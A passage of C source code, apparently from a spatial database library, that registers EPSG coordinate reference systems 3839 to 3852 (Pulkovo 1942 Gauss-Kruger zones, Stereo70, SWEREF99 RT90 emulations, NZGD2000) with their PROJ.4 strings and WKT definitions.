\"PROJCS[\\\"Pulkovo 1942(58) / 3-degree Gauss-Kruger zone 9\");\n    add_srs_wkt (p, 1,\n        \"\\\",GEOGCS[\\\"Pulkovo 1942(58)\\\",DATUM[\\\"Pulkovo_1942_58\\\"\");\n    add_srs_wkt (p, 2,\n        \",SPHEROID[\\\"Krassowsky 1940\\\",6378245,298.3,AUTHORITY[\\\"\");\n    add_srs_wkt (p, 3,\n        \"EPSG\\\",\\\"7024\\\"]],TOWGS84[33.4,-146.6,-76.3,-0.359,-0.05\");\n    add_srs_wkt (p, 4,\n        \"3,0.844,-0.84],AUTHORITY[\\\"EPSG\\\",\\\"6179\\\"]],PRIMEM[\\\"Gr\");\n    add_srs_wkt (p, 5,\n        \"eenwich\\\",0,AUTHORITY[\\\"EPSG\\\",\\\"8901\\\"]],UNIT[\\\"degree\\\"\");\n    add_srs_wkt (p, 6,\n        \",0.0174532925199433,AUTHORITY[\\\"EPSG\\\",\\\"9122\\\"]],AUTHOR\");\n    add_srs_wkt (p, 7,\n        \"ITY[\\\"EPSG\\\",\\\"4179\\\"]],PROJECTION[\\\"Transverse_Mercator\");\n    add_srs_wkt (p, 8,\n        \"\\\"],PARAMETER[\\\"latitude_of_origin\\\",0],PARAMETER[\\\"cent\");\n    add_srs_wkt (p, 9,\n        \"ral_meridian\\\",27],PARAMETER[\\\"scale_factor\\\",1],PARAMET\");\n    add_srs_wkt (p, 10,\n        \"ER[\\\"false_easting\\\",9500000],PARAMETER[\\\"false_northing\");\n    add_srs_wkt (p, 11,\n        \"\\\",0],UNIT[\\\"metre\\\",1,AUTHORITY[\\\"EPSG\\\",\\\"9001\\\"]],AXI\");\n    add_srs_wkt (p, 12,\n        \"S[\\\"X\\\",NORTH],AXIS[\\\"Y\\\",EAST],AUTHORITY[\\\"EPSG\\\",\\\"383\");\n    add_srs_wkt (p, 13,\n        \"9\\\"]]\");\n    p = add_epsg_def (filter, first, last, 3840, \"epsg\", 3840,\n        \"Pulkovo 1942(58) / 3-degree Gauss-Kruger zone 10\");\n    add_proj4text (p, 0,\n        \"+proj=tmerc +lat_0=0 +lon_0=30 +k=1 +x_0=10500000 +y_0=0\");\n    add_proj4text (p, 1,\n        \" +ellps=krass +towgs84=33.4,-146.6,-76.3,-0.359,-0.053,0\");\n    add_proj4text (p, 2,\n        \".844,-0.84 +units=m +no_defs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"Pulkovo 1942(58) / 3-degree Gauss-Kruger zone 1\");\n    add_srs_wkt (p, 1,\n        \"0\\\",GEOGCS[\\\"Pulkovo 1942(58)\\\",DATUM[\\\"Pulkovo_1942_58\\\"\");\n    add_srs_wkt (p, 2,\n        \",SPHEROID[\\\"Krassowsky 1940\\\",6378245,298.3,AUTHORITY[\\\"\");\n    add_srs_wkt (p, 3,\n        \"EPSG\\\",\\\"7024\\\"]],TOWGS84[33.4,-146.6,-76.3,-0.359,-0.05\");\n    add_srs_wkt (p, 4,\n        \"3,0.844,-0.84],AUTHORITY[\\\"EPSG\\\",\\\"6179\\\"]],PRIMEM[\\\"Gr\");\n    add_srs_wkt (p, 5,\n        \"eenwich\\\",0,AUTHORITY[\\\"EPSG\\\",\\\"8901\\\"]],UNIT[\\\"degree\\\"\");\n    add_srs_wkt (p, 6,\n        \",0.0174532925199433,AUTHORITY[\\\"EPSG\\\",\\\"9122\\\"]],AUTHOR\");\n    add_srs_wkt (p, 7,\n        \"ITY[\\\"EPSG\\\",\\\"4179\\\"]],PROJECTION[\\\"Transverse_Mercator\");\n    add_srs_wkt (p, 8,\n        \"\\\"],PARAMETER[\\\"latitude_of_origin\\\",0],PARAMETER[\\\"cent\");\n    add_srs_wkt (p, 9,\n        \"ral_meridian\\\",30],PARAMETER[\\\"scale_factor\\\",1],PARAMET\");\n    add_srs_wkt (p, 10,\n        \"ER[\\\"false_easting\\\",10500000],PARAMETER[\\\"false_northin\");\n    add_srs_wkt (p, 11,\n        \"g\\\",0],UNIT[\\\"metre\\\",1,AUTHORITY[\\\"EPSG\\\",\\\"9001\\\"]],AX\");\n    add_srs_wkt (p, 12,\n        \"IS[\\\"X\\\",NORTH],AXIS[\\\"Y\\\",EAST],AUTHORITY[\\\"EPSG\\\",\\\"38\");\n    add_srs_wkt (p, 13,\n        \"40\\\"]]\");\n    p = add_epsg_def (filter, first, last, 3841, \"epsg\", 3841,\n        \"Pulkovo 1942(83) / 3-degree Gauss-Kruger zone 6\");\n    add_proj4text (p, 0,\n        \"+proj=tmerc +lat_0=0 +lon_0=18 +k=1 +x_0=6500000 +y_0=0 \");\n    add_proj4text (p, 1,\n        \"+ellps=krass +towgs84=26,-121,-78,0,0,0,0 +units=m +no_d\");\n    add_proj4text (p, 2,\n        \"efs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"Pulkovo 1942(83) / 3-degree Gauss-Kruger zone 6\");\n    add_srs_wkt (p, 1,\n        \"\\\",GEOGCS[\\\"Pulkovo 1942(83)\\\",DATUM[\\\"Pulkovo_1942_83\\\"\");\n    add_srs_wkt (p, 2,\n        \",SPHEROID[\\\"Krassowsky 1940\\\",6378245,298.3,AUTHORITY[\\\"\");\n    add_srs_wkt (p, 3,\n        \"EPSG\\\",\\\"7024\\\"]],TOWGS84[26,-121,-78,0,0,0,0],AUTHORITY\");\n    add_srs_wkt (p, 4,\n        \"[\\\"EPSG\\\",\\\"6178\\\"]],PRIMEM[\\\"Greenwich\\\",0,AUTHORITY[\\\"\");\n    add_srs_wkt (p, 5,\n        \"EPSG\\\",\\\"8901\\\"]],UNIT[\\\"degree\\\",0.0174532925199433,AUT\");\n    add_srs_wkt (p, 6,\n        \"HORITY[\\\"EPSG\\\",\\\"9122\\\"]],AUTHORITY[\\\"EPSG\\\",\\\"4178\\\"]]\");\n    add_srs_wkt (p, 7,\n        \",PROJECTION[\\\"Transverse_Mercator\\\"],PARAMETER[\\\"latitud\");\n    add_srs_wkt (p, 8,\n        \"e_of_origin\\\",0],PARAMETER[\\\"central_meridian\\\",18],PARA\");\n    add_srs_wkt (p, 9,\n        \"METER[\\\"scale_factor\\\",1],PARAMETER[\\\"false_easting\\\",65\");\n    add_srs_wkt (p, 10,\n        \"00000],PARAMETER[\\\"false_northing\\\",0],UNIT[\\\"metre\\\",1,\");\n    add_srs_wkt (p, 11,\n        \"AUTHORITY[\\\"EPSG\\\",\\\"9001\\\"]],AXIS[\\\"X\\\",NORTH],AXIS[\\\"Y\");\n    add_srs_wkt (p, 12,\n        \"\\\",EAST],AUTHORITY[\\\"EPSG\\\",\\\"3841\\\"]]\");\n    p = add_epsg_def (filter, first, last, 3842, \"epsg\", 3842,\n        \"Pulkovo 1942(83) / 3-degree Gauss-Kruger zone 7 (deprecated)\");\n    add_proj4text (p, 0,\n        \"+proj=tmerc +lat_0=0 +lon_0=18 +k=1 +x_0=6500000 +y_0=0 \");\n    add_proj4text (p, 1,\n        \"+ellps=krass +towgs84=26,-121,-78,0,0,0,0 +units=m +no_d\");\n    add_proj4text (p, 2,\n        \"efs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"Pulkovo 1942(83) / 3-degree Gauss-Kruger zone 7\");\n    add_srs_wkt (p, 1,\n        \" (deprecated)\\\",GEOGCS[\\\"Pulkovo 1942(83)\\\",DATUM[\\\"Pulk\");\n    add_srs_wkt (p, 2,\n        \"ovo_1942_83\\\",SPHEROID[\\\"Krassowsky 1940\\\",6378245,298.3\");\n    add_srs_wkt (p, 3,\n        \",AUTHORITY[\\\"EPSG\\\",\\\"7024\\\"]],TOWGS84[26,-121,-78,0,0,0\");\n    add_srs_wkt (p, 4,\n        \",0],AUTHORITY[\\\"EPSG\\\",\\\"6178\\\"]],PRIMEM[\\\"Greenwich\\\",0\");\n    add_srs_wkt (p, 5,\n        \",AUTHORITY[\\\"EPSG\\\",\\\"8901\\\"]],UNIT[\\\"degree\\\",0.0174532\");\n    add_srs_wkt (p, 6,\n        \"925199433,AUTHORITY[\\\"EPSG\\\",\\\"9122\\\"]],AUTHORITY[\\\"EPSG\");\n    add_srs_wkt (p, 7,\n        \"\\\",\\\"4178\\\"]],PROJECTION[\\\"Transverse_Mercator\\\"],PARAME\");\n    add_srs_wkt (p, 8,\n        \"TER[\\\"latitude_of_origin\\\",0],PARAMETER[\\\"central_meridi\");\n    add_srs_wkt (p, 9,\n        \"an\\\",18],PARAMETER[\\\"scale_factor\\\",1],PARAMETER[\\\"false\");\n    add_srs_wkt (p, 10,\n        \"_easting\\\",6500000],PARAMETER[\\\"false_northing\\\",0],UNIT\");\n    add_srs_wkt (p, 11,\n        \"[\\\"metre\\\",1,AUTHORITY[\\\"EPSG\\\",\\\"9001\\\"]],AXIS[\\\"X\\\",NO\");\n    add_srs_wkt (p, 12,\n        \"RTH],AXIS[\\\"Y\\\",EAST],AUTHORITY[\\\"EPSG\\\",\\\"3842\\\"]]\");\n    p = add_epsg_def (filter, first, last, 3843, \"epsg\", 3843,\n        \"Pulkovo 1942(83) / 3-degree Gauss-Kruger zone 8 (deprecated)\");\n    add_proj4text (p, 0,\n        \"+proj=tmerc +lat_0=0 +lon_0=18 +k=1 +x_0=6500000 +y_0=0 \");\n    add_proj4text (p, 1,\n        \"+ellps=krass +towgs84=26,-121,-78,0,0,0,0 +units=m +no_d\");\n    add_proj4text (p, 2,\n        \"efs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"Pulkovo 1942(83) / 3-degree Gauss-Kruger zone 8\");\n    add_srs_wkt (p, 1,\n        \" (deprecated)\\\",GEOGCS[\\\"Pulkovo 1942(83)\\\",DATUM[\\\"Pulk\");\n    add_srs_wkt (p, 2,\n        \"ovo_1942_83\\\",SPHEROID[\\\"Krassowsky 1940\\\",6378245,298.3\");\n    add_srs_wkt (p, 3,\n        \",AUTHORITY[\\\"EPSG\\\",\\\"7024\\\"]],TOWGS84[26,-121,-78,0,0,0\");\n    add_srs_wkt (p, 4,\n        \",0],AUTHORITY[\\\"EPSG\\\",\\\"6178\\\"]],PRIMEM[\\\"Greenwich\\\",0\");\n    add_srs_wkt (p, 5,\n        \",AUTHORITY[\\\"EPSG\\\",\\\"8901\\\"]],UNIT[\\\"degree\\\",0.0174532\");\n    add_srs_wkt (p, 6,\n        \"925199433,AUTHORITY[\\\"EPSG\\\",\\\"9122\\\"]],AUTHORITY[\\\"EPSG\");\n    add_srs_wkt (p, 7,\n        \"\\\",\\\"4178\\\"]],PROJECTION[\\\"Transverse_Mercator\\\"],PARAME\");\n    add_srs_wkt (p, 8,\n        \"TER[\\\"latitude_of_origin\\\",0],PARAMETER[\\\"central_meridi\");\n    add_srs_wkt (p, 9,\n        \"an\\\",18],PARAMETER[\\\"scale_factor\\\",1],PARAMETER[\\\"false\");\n    add_srs_wkt (p, 10,\n        \"_easting\\\",6500000],PARAMETER[\\\"false_northing\\\",0],UNIT\");\n    add_srs_wkt (p, 11,\n        \"[\\\"metre\\\",1,AUTHORITY[\\\"EPSG\\\",\\\"9001\\\"]],AXIS[\\\"X\\\",NO\");\n    add_srs_wkt (p, 12,\n        \"RTH],AXIS[\\\"Y\\\",EAST],AUTHORITY[\\\"EPSG\\\",\\\"3843\\\"]]\");\n    p = add_epsg_def (filter, first, last, 3844, \"epsg\", 3844,\n        \"Pulkovo 1942(58) / Stereo70\");\n    add_proj4text (p, 0,\n        \"+proj=sterea +lat_0=46 +lon_0=25 +k=0.99975 +x_0=500000 \");\n    add_proj4text (p, 1,\n        \"+y_0=500000 +ellps=krass +towgs84=33.4,-146.6,-76.3,-0.3\");\n    add_proj4text (p, 2,\n        \"59,-0.053,0.844,-0.84 +units=m +no_defs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"Pulkovo 1942(58) / Stereo70\\\",GEOGCS[\\\"Pulkovo \");\n    add_srs_wkt (p, 1,\n        \"1942(58)\\\",DATUM[\\\"Pulkovo_1942_58\\\",SPHEROID[\\\"Krassows\");\n    add_srs_wkt (p, 2,\n        \"ky 1940\\\",6378245,298.3,AUTHORITY[\\\"EPSG\\\",\\\"7024\\\"]],TO\");\n    add_srs_wkt (p, 3,\n        \"WGS84[33.4,-146.6,-76.3,-0.359,-0.053,0.844,-0.84],AUTHO\");\n    add_srs_wkt (p, 4,\n        \"RITY[\\\"EPSG\\\",\\\"6179\\\"]],PRIMEM[\\\"Greenwich\\\",0,AUTHORIT\");\n    add_srs_wkt (p, 5,\n        \"Y[\\\"EPSG\\\",\\\"8901\\\"]],UNIT[\\\"degree\\\",0.0174532925199433\");\n    add_srs_wkt (p, 6,\n        \",AUTHORITY[\\\"EPSG\\\",\\\"9122\\\"]],AUTHORITY[\\\"EPSG\\\",\\\"4179\");\n    add_srs_wkt (p, 7,\n        \"\\\"]],PROJECTION[\\\"Oblique_Stereographic\\\"],PARAMETER[\\\"l\");\n    add_srs_wkt (p, 8,\n        \"atitude_of_origin\\\",46],PARAMETER[\\\"central_meridian\\\",2\");\n    add_srs_wkt (p, 9,\n        \"5],PARAMETER[\\\"scale_factor\\\",0.99975],PARAMETER[\\\"false\");\n    add_srs_wkt (p, 10,\n        \"_easting\\\",500000],PARAMETER[\\\"false_northing\\\",500000],\");\n    add_srs_wkt (p, 11,\n        \"UNIT[\\\"metre\\\",1,AUTHORITY[\\\"EPSG\\\",\\\"9001\\\"]],AXIS[\\\"X\\\"\");\n    add_srs_wkt (p, 12,\n        \",NORTH],AXIS[\\\"Y\\\",EAST],AUTHORITY[\\\"EPSG\\\",\\\"3844\\\"]]\");\n    p = add_epsg_def (filter, first, last, 3845, \"epsg\", 3845,\n        \"SWEREF99 / RT90 7.5 gon V emulation\");\n    add_proj4text (p, 0,\n        \"+proj=tmerc +lat_0=0 +lon_0=11.30625 +k=1.000006 +x_0=15\");\n    add_proj4text (p, 1,\n        \"00025.141 +y_0=-667.282 +ellps=GRS80 +towgs84=0,0,0,0,0,\");\n    add_proj4text (p, 2,\n        \"0,0 +units=m +no_defs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"SWEREF99 / RT90 7.5 gon V emulation\\\",GEOGCS[\\\"\");\n    add_srs_wkt (p, 1,\n        \"SWEREF99\\\",DATUM[\\\"SWEREF99\\\",SPHEROID[\\\"GRS 1980\\\",6378\");\n    add_srs_wkt (p, 2,\n        \"137,298.257222101,AUTHORITY[\\\"EPSG\\\",\\\"7019\\\"]],TOWGS84[\");\n    add_srs_wkt (p, 3,\n        \"0,0,0,0,0,0,0],AUTHORITY[\\\"EPSG\\\",\\\"6619\\\"]],PRIMEM[\\\"Gr\");\n    add_srs_wkt (p, 4,\n        \"eenwich\\\",0,AUTHORITY[\\\"EPSG\\\",\\\"8901\\\"]],UNIT[\\\"degree\\\"\");\n    add_srs_wkt (p, 5,\n        \",0.0174532925199433,AUTHORITY[\\\"EPSG\\\",\\\"9122\\\"]],AUTHOR\");\n    add_srs_wkt (p, 6,\n        \"ITY[\\\"EPSG\\\",\\\"4619\\\"]],PROJECTION[\\\"Transverse_Mercator\");\n    add_srs_wkt (p, 7,\n        \"\\\"],PARAMETER[\\\"latitude_of_origin\\\",0],PARAMETER[\\\"cent\");\n    add_srs_wkt (p, 8,\n        \"ral_meridian\\\",11.30625],PARAMETER[\\\"scale_factor\\\",1.00\");\n    add_srs_wkt (p, 9,\n        \"0006],PARAMETER[\\\"false_easting\\\",1500025.141],PARAMETER\");\n    add_srs_wkt (p, 10,\n        \"[\\\"false_northing\\\",-667.282],UNIT[\\\"metre\\\",1,AUTHORITY\");\n    add_srs_wkt (p, 11,\n        \"[\\\"EPSG\\\",\\\"9001\\\"]],AXIS[\\\"X\\\",NORTH],AXIS[\\\"Y\\\",EAST],\");\n    add_srs_wkt (p, 12,\n        \"AUTHORITY[\\\"EPSG\\\",\\\"3845\\\"]]\");\n    p = add_epsg_def (filter, first, last, 3846, \"epsg\", 3846,\n        \"SWEREF99 / RT90 5 gon V emulation\");\n    add_proj4text (p, 0,\n        \"+proj=tmerc +lat_0=0 +lon_0=13.55626666666667 +k=1.00000\");\n    add_proj4text (p, 1,\n        \"58 +x_0=1500044.695 +y_0=-667.13 +ellps=GRS80 +towgs84=0\");\n    add_proj4text (p, 2,\n        \",0,0,0,0,0,0 +units=m +no_defs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"SWEREF99 / RT90 5 gon V emulation\\\",GEOGCS[\\\"SW\");\n    add_srs_wkt (p, 1,\n        \"EREF99\\\",DATUM[\\\"SWEREF99\\\",SPHEROID[\\\"GRS 1980\\\",637813\");\n    add_srs_wkt (p, 2,\n        \"7,298.257222101,AUTHORITY[\\\"EPSG\\\",\\\"7019\\\"]],TOWGS84[0,\");\n    add_srs_wkt (p, 3,\n        \"0,0,0,0,0,0],AUTHORITY[\\\"EPSG\\\",\\\"6619\\\"]],PRIMEM[\\\"Gree\");\n    add_srs_wkt (p, 4,\n        \"nwich\\\",0,AUTHORITY[\\\"EPSG\\\",\\\"8901\\\"]],UNIT[\\\"degree\\\",\");\n    add_srs_wkt (p, 5,\n        \"0.0174532925199433,AUTHORITY[\\\"EPSG\\\",\\\"9122\\\"]],AUTHORI\");\n    add_srs_wkt (p, 6,\n        \"TY[\\\"EPSG\\\",\\\"4619\\\"]],PROJECTION[\\\"Transverse_Mercator\\\"\");\n    add_srs_wkt (p, 7,\n        \"],PARAMETER[\\\"latitude_of_origin\\\",0],PARAMETER[\\\"centra\");\n    add_srs_wkt (p, 8,\n        \"l_meridian\\\",13.55626666666667],PARAMETER[\\\"scale_factor\");\n    add_srs_wkt (p, 9,\n        \"\\\",1.0000058],PARAMETER[\\\"false_easting\\\",1500044.695],P\");\n    add_srs_wkt (p, 10,\n        \"ARAMETER[\\\"false_northing\\\",-667.13],UNIT[\\\"metre\\\",1,AU\");\n    add_srs_wkt (p, 11,\n        \"THORITY[\\\"EPSG\\\",\\\"9001\\\"]],AXIS[\\\"X\\\",NORTH],AXIS[\\\"Y\\\"\");\n    add_srs_wkt (p, 12,\n        \",EAST],AUTHORITY[\\\"EPSG\\\",\\\"3846\\\"]]\");\n    p = add_epsg_def (filter, first, last, 3847, \"epsg\", 3847,\n        \"SWEREF99 / RT90 2.5 gon V emulation\");\n    add_proj4text (p, 0,\n        \"+proj=tmerc +lat_0=0 +lon_0=15.80628452944445 +k=1.00000\");\n    add_proj4text (p, 1,\n        \"561024 +x_0=1500064.274 +y_0=-667.711 +ellps=GRS80 +towg\");\n    add_proj4text (p, 2,\n        \"s84=0,0,0,0,0,0,0 +units=m +no_defs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"SWEREF99 / RT90 2.5 gon V emulation\\\",GEOGCS[\\\"\");\n    add_srs_wkt (p, 1,\n        \"SWEREF99\\\",DATUM[\\\"SWEREF99\\\",SPHEROID[\\\"GRS 1980\\\",6378\");\n    add_srs_wkt (p, 2,\n        \"137,298.257222101,AUTHORITY[\\\"EPSG\\\",\\\"7019\\\"]],TOWGS84[\");\n    add_srs_wkt (p, 3,\n        \"0,0,0,0,0,0,0],AUTHORITY[\\\"EPSG\\\",\\\"6619\\\"]],PRIMEM[\\\"Gr\");\n    add_srs_wkt (p, 4,\n        \"eenwich\\\",0,AUTHORITY[\\\"EPSG\\\",\\\"8901\\\"]],UNIT[\\\"degree\\\"\");\n    add_srs_wkt (p, 5,\n        \",0.0174532925199433,AUTHORITY[\\\"EPSG\\\",\\\"9122\\\"]],AUTHOR\");\n    add_srs_wkt (p, 6,\n        \"ITY[\\\"EPSG\\\",\\\"4619\\\"]],PROJECTION[\\\"Transverse_Mercator\");\n    add_srs_wkt (p, 7,\n        \"\\\"],PARAMETER[\\\"latitude_of_origin\\\",0],PARAMETER[\\\"cent\");\n    add_srs_wkt (p, 8,\n        \"ral_meridian\\\",15.80628452944445],PARAMETER[\\\"scale_fact\");\n    add_srs_wkt (p, 9,\n        \"or\\\",1.00000561024],PARAMETER[\\\"false_easting\\\",1500064.\");\n    add_srs_wkt (p, 10,\n        \"274],PARAMETER[\\\"false_northing\\\",-667.711],UNIT[\\\"metre\");\n    add_srs_wkt (p, 11,\n        \"\\\",1,AUTHORITY[\\\"EPSG\\\",\\\"9001\\\"]],AXIS[\\\"X\\\",NORTH],AXI\");\n    add_srs_wkt (p, 12,\n        \"S[\\\"Y\\\",EAST],AUTHORITY[\\\"EPSG\\\",\\\"3847\\\"]]\");\n    p = add_epsg_def (filter, first, last, 3848, \"epsg\", 3848,\n        \"SWEREF99 / RT90 0 gon emulation\");\n    add_proj4text (p, 0,\n        \"+proj=tmerc +lat_0=0 +lon_0=18.0563 +k=1.0000054 +x_0=15\");\n    add_proj4text (p, 1,\n        \"00083.521 +y_0=-668.8440000000001 +ellps=GRS80 +towgs84=\");\n    add_proj4text (p, 2,\n        \"0,0,0,0,0,0,0 +units=m +no_defs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"SWEREF99 / RT90 0 gon emulation\\\",GEOGCS[\\\"SWER\");\n    add_srs_wkt (p, 1,\n        \"EF99\\\",DATUM[\\\"SWEREF99\\\",SPHEROID[\\\"GRS 1980\\\",6378137,\");\n    add_srs_wkt (p, 2,\n        \"298.257222101,AUTHORITY[\\\"EPSG\\\",\\\"7019\\\"]],TOWGS84[0,0,\");\n    add_srs_wkt (p, 3,\n        \"0,0,0,0,0],AUTHORITY[\\\"EPSG\\\",\\\"6619\\\"]],PRIMEM[\\\"Greenw\");\n    add_srs_wkt (p, 4,\n        \"ich\\\",0,AUTHORITY[\\\"EPSG\\\",\\\"8901\\\"]],UNIT[\\\"degree\\\",0.\");\n    add_srs_wkt (p, 5,\n        \"0174532925199433,AUTHORITY[\\\"EPSG\\\",\\\"9122\\\"]],AUTHORITY\");\n    add_srs_wkt (p, 6,\n        \"[\\\"EPSG\\\",\\\"4619\\\"]],PROJECTION[\\\"Transverse_Mercator\\\"]\");\n    add_srs_wkt (p, 7,\n        \",PARAMETER[\\\"latitude_of_origin\\\",0],PARAMETER[\\\"central\");\n    add_srs_wkt (p, 8,\n        \"_meridian\\\",18.0563],PARAMETER[\\\"scale_factor\\\",1.000005\");\n    add_srs_wkt (p, 9,\n        \"4],PARAMETER[\\\"false_easting\\\",1500083.521],PARAMETER[\\\"\");\n    add_srs_wkt (p, 10,\n        \"false_northing\\\",-668.844],UNIT[\\\"metre\\\",1,AUTHORITY[\\\"\");\n    add_srs_wkt (p, 11,\n        \"EPSG\\\",\\\"9001\\\"]],AXIS[\\\"X\\\",NORTH],AXIS[\\\"Y\\\",EAST],AUT\");\n    add_srs_wkt (p, 12,\n        \"HORITY[\\\"EPSG\\\",\\\"3848\\\"]]\");\n    p = add_epsg_def (filter, first, last, 3849, \"epsg\", 3849,\n        \"SWEREF99 / RT90 2.5 gon O emulation\");\n    add_proj4text (p, 0,\n        \"+proj=tmerc +lat_0=0 +lon_0=20.30631666666667 +k=1.00000\");\n    add_proj4text (p, 1,\n        \"52 +x_0=1500102.765 +y_0=-670.706 +ellps=GRS80 +towgs84=\");\n    add_proj4text (p, 2,\n        \"0,0,0,0,0,0,0 +units=m +no_defs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"SWEREF99 / RT90 2.5 gon O emulation\\\",GEOGCS[\\\"\");\n    add_srs_wkt (p, 1,\n        \"SWEREF99\\\",DATUM[\\\"SWEREF99\\\",SPHEROID[\\\"GRS 1980\\\",6378\");\n    add_srs_wkt (p, 2,\n        \"137,298.257222101,AUTHORITY[\\\"EPSG\\\",\\\"7019\\\"]],TOWGS84[\");\n    add_srs_wkt (p, 3,\n        \"0,0,0,0,0,0,0],AUTHORITY[\\\"EPSG\\\",\\\"6619\\\"]],PRIMEM[\\\"Gr\");\n    add_srs_wkt (p, 4,\n        \"eenwich\\\",0,AUTHORITY[\\\"EPSG\\\",\\\"8901\\\"]],UNIT[\\\"degree\\\"\");\n    add_srs_wkt (p, 5,\n        \",0.0174532925199433,AUTHORITY[\\\"EPSG\\\",\\\"9122\\\"]],AUTHOR\");\n    add_srs_wkt (p, 6,\n        \"ITY[\\\"EPSG\\\",\\\"4619\\\"]],PROJECTION[\\\"Transverse_Mercator\");\n    add_srs_wkt (p, 7,\n        \"\\\"],PARAMETER[\\\"latitude_of_origin\\\",0],PARAMETER[\\\"cent\");\n    add_srs_wkt (p, 8,\n        \"ral_meridian\\\",20.30631666666667],PARAMETER[\\\"scale_fact\");\n    add_srs_wkt (p, 9,\n        \"or\\\",1.0000052],PARAMETER[\\\"false_easting\\\",1500102.765]\");\n    add_srs_wkt (p, 10,\n        \",PARAMETER[\\\"false_northing\\\",-670.706],UNIT[\\\"metre\\\",1\");\n    add_srs_wkt (p, 11,\n        \",AUTHORITY[\\\"EPSG\\\",\\\"9001\\\"]],AXIS[\\\"X\\\",NORTH],AXIS[\\\"\");\n    add_srs_wkt (p, 12,\n        \"Y\\\",EAST],AUTHORITY[\\\"EPSG\\\",\\\"3849\\\"]]\");\n    p = add_epsg_def (filter, first, last, 3850, \"epsg\", 3850,\n        \"SWEREF99 / RT90 5 gon O emulation\");\n    add_proj4text (p, 0,\n        \"+proj=tmerc +lat_0=0 +lon_0=22.55633333333333 +k=1.00000\");\n    add_proj4text (p, 1,\n        \"49 +x_0=1500121.846 +y_0=-672.557 +ellps=GRS80 +towgs84=\");\n    add_proj4text (p, 2,\n        \"0,0,0,0,0,0,0 +units=m +no_defs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"SWEREF99 / RT90 5 gon O emulation\\\",GEOGCS[\\\"SW\");\n    add_srs_wkt (p, 1,\n        \"EREF99\\\",DATUM[\\\"SWEREF99\\\",SPHEROID[\\\"GRS 1980\\\",637813\");\n    add_srs_wkt (p, 2,\n        \"7,298.257222101,AUTHORITY[\\\"EPSG\\\",\\\"7019\\\"]],TOWGS84[0,\");\n    add_srs_wkt (p, 3,\n        \"0,0,0,0,0,0],AUTHORITY[\\\"EPSG\\\",\\\"6619\\\"]],PRIMEM[\\\"Gree\");\n    add_srs_wkt (p, 4,\n        \"nwich\\\",0,AUTHORITY[\\\"EPSG\\\",\\\"8901\\\"]],UNIT[\\\"degree\\\",\");\n    add_srs_wkt (p, 5,\n        \"0.0174532925199433,AUTHORITY[\\\"EPSG\\\",\\\"9122\\\"]],AUTHORI\");\n    add_srs_wkt (p, 6,\n        \"TY[\\\"EPSG\\\",\\\"4619\\\"]],PROJECTION[\\\"Transverse_Mercator\\\"\");\n    add_srs_wkt (p, 7,\n        \"],PARAMETER[\\\"latitude_of_origin\\\",0],PARAMETER[\\\"centra\");\n    add_srs_wkt (p, 8,\n        \"l_meridian\\\",22.55633333333333],PARAMETER[\\\"scale_factor\");\n    add_srs_wkt (p, 9,\n        \"\\\",1.0000049],PARAMETER[\\\"false_easting\\\",1500121.846],P\");\n    add_srs_wkt (p, 10,\n        \"ARAMETER[\\\"false_northing\\\",-672.557],UNIT[\\\"metre\\\",1,A\");\n    add_srs_wkt (p, 11,\n        \"UTHORITY[\\\"EPSG\\\",\\\"9001\\\"]],AXIS[\\\"X\\\",NORTH],AXIS[\\\"Y\\\"\");\n    add_srs_wkt (p, 12,\n        \",EAST],AUTHORITY[\\\"EPSG\\\",\\\"3850\\\"]]\");\n    p = add_epsg_def (filter, first, last, 3851, \"epsg\", 3851,\n        \"NZGD2000 / NZCS2000\");\n    add_proj4text (p, 0,\n        \"+proj=lcc +lat_1=-37.5 +lat_2=-44.5 +lat_0=-41 +lon_0=17\");\n    add_proj4text (p, 1,\n        \"3 +x_0=3000000 +y_0=7000000 +ellps=GRS80 +towgs84=0,0,0,\");\n    add_proj4text (p, 2,\n        \"0,0,0,0 +units=m +no_defs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"NZGD2000 / NZCS2000\\\",GEOGCS[\\\"NZGD2000\\\",DATUM\");\n    add_srs_wkt (p, 1,\n        \"[\\\"New_Zealand_Geodetic_Datum_2000\\\",SPHEROID[\\\"GRS 1980\");\n    add_srs_wkt (p, 2,\n        \"\\\",6378137,298.257222101,AUTHORITY[\\\"EPSG\\\",\\\"7019\\\"]],T\");\n    add_srs_wkt (p, 3,\n        \"OWGS84[0,0,0,0,0,0,0],AUTHORITY[\\\"EPSG\\\",\\\"6167\\\"]],PRIM\");\n    add_srs_wkt (p, 4,\n        \"EM[\\\"Greenwich\\\",0,AUTHORITY[\\\"EPSG\\\",\\\"8901\\\"]],UNIT[\\\"\");\n    add_srs_wkt (p, 5,\n        \"degree\\\",0.0174532925199433,AUTHORITY[\\\"EPSG\\\",\\\"9122\\\"]\");\n    add_srs_wkt (p, 6,\n        \"],AUTHORITY[\\\"EPSG\\\",\\\"4167\\\"]],PROJECTION[\\\"Lambert_Con\");\n    add_srs_wkt (p, 7,\n        \"formal_Conic_2SP\\\"],PARAMETER[\\\"standard_parallel_1\\\",-3\");\n    add_srs_wkt (p, 8,\n        \"7.5],PARAMETER[\\\"standard_parallel_2\\\",-44.5],PARAMETER[\");\n    add_srs_wkt (p, 9,\n        \"\\\"latitude_of_origin\\\",-41],PARAMETER[\\\"central_meridian\");\n    add_srs_wkt (p, 10,\n        \"\\\",173],PARAMETER[\\\"false_easting\\\",3000000],PARAMETER[\\\"\");\n    add_srs_wkt (p, 11,\n        \"false_northing\\\",7000000],UNIT[\\\"metre\\\",1,AUTHORITY[\\\"E\");\n    add_srs_wkt (p, 12,\n        \"PSG\\\",\\\"9001\\\"]],AXIS[\\\"Northing\\\",NORTH],AXIS[\\\"Easting\");\n    add_srs_wkt (p, 13,\n        \"\\\",EAST],AUTHORITY[\\\"EPSG\\\",\\\"3851\\\"]]\");\n    p = add_epsg_def (filter, first, last, 3852, \"epsg\", 3852,\n        \"RSRGD2000 / DGLC2000\");\n    add_proj4text (p, 0,\n        \"+proj=lcc 